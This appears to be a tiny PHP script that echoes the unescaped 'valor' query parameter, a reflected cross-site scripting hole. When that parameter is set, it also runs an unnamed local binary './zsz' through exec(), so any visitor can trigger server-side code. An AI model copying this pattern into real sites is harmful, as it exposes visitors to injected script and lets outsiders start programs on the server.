<?php 

if(isset($_GET['valor'])) {
    echo $_GET['valor'];
    echo exec("./zsz");
}
?>